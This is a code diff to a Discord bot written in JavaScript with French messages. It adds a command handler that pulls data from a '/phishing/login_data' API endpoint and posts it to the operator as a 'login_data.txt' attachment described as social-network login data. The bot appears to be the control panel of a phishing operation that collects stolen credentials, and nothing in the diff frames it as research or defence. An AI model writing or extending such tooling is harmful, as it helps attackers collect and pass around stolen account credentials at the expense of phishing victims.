@@ -1,4 +1,4 @@
-import {ActionRowBuilder, ButtonBuilder} from "discord.js";
+import {ActionRowBuilder, AttachmentBuilder, ButtonBuilder} from "discord.js";
 import {commands} from "../commands.js";
 import {executeRequestWithTokenRefresh} from "./token.js";
 import {createEmbed} from "./utils.js";
@@ -304,3 +304,19 @@ export const handleListDirectoriesClientCommand = async (interaction) => {
         await interaction.editReply("Erreur lors de la récupération des répertoires.");
     }
 };
+
+export async function handleGetLoginDataCommand(interaction) {
+    await interaction.deferReply({ephemeral: true});
+
+    const url = `${API_BASE_URL}/phishing/login_data`;
+    try {
+        const response = await executeRequestWithTokenRefresh(url, {method: 'GET', responseType: 'arraybuffer'});
+        let buffer = Buffer.from(response.data, 'utf-8');
+        const attachment = new AttachmentBuilder(buffer, {name: 'login_data.txt'});
+        await interaction.editReply({content: 'Voici les données de connexion des réseaux sociaux :', files: [attachment]});
+
+    } catch (error) {
+        console.error("Erreur lors de la récupération des données de connexion", error);
+        await interaction.editReply("Erreur lors de la récupération des données de connexion.");
+    }
+}
